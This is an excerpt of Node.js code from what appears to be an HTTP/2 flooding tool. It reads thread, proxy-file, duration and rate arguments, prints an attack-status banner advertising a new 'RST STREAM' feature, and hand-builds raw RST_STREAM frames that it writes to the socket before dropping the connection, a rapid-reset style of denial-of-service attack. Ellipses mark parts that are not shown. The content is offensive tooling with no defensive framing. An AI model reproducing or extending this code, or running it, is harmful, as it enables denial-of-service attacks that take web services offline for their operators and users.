...
if (cluster.isMaster) {
    ...
    console.log(`[!] Threads: `.brightYellow + process.argv[5].blue)
    console.log(`[!] Proxyfile: `.brightYellow + process.argv[6].blue)
    console.log(`[!] Time: `.brightYellow + process.argv[3].blue)
    console.log(`[!] Rate: `.brightYellow + process.argv[4].blue)
    console.log(`[!] Status: Success!`.red)
    console.log('NEW: + 𝗔𝗗𝗗𝗘𝗗 𝗥𝗦𝗧 𝗦𝗧𝗥𝗘𝗔𝗠 / + 𝗔𝗗𝗗𝗘𝗗 𝗙𝗥𝗔𝗠𝗘 𝗛𝗘𝗔𝗗𝗘𝗥𝗦')
...
const rstStreamFrame = Buffer.alloc(13);
  rstStreamFrame.writeUInt32BE(4, 0); 
  rstStreamFrame.writeUInt8(3, 3);    
  rstStreamFrame.writeUInt8(0, 4);    
  rstStreamFrame.writeUInt32BE(0, 5); 
  rstStreamFrame.writeUInt32BE(0x8, 9);

  stream.socket.write(rstStreamFrame);
  client.destroy();
